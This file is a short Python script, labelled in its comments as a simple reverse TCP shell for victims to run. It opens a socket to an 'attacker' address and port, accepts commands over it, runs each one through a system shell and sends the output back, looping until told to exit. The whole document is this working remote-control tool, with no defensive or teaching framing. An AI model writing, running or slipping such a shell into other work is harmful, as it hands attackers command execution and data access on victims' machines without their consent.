#/usr/bin/env python
### Simple reverse tcp shell
### victims execute this file
import socket, subprocess, os

attacker_ip = "127.0.0.1"                  # attacker's ip
attacker_port = 6666                         # attacker's port
victim_ip = socket.gethostbyname(socket.gethostname())   # get victim's ip(victim is running this script now)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((attacker_ip, attacker_port))
# s.send("connection from ip: " + victim_ip)

while True:
    command = s.recv(1024)   # receive shell command
    if command == "exit" or command == "quit":
        break
    # run command
    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    # read output
    output = proc.stdout.read() + proc.stderr.read()
    # send to attacker
    s.send(output)

# done attack
s.close()
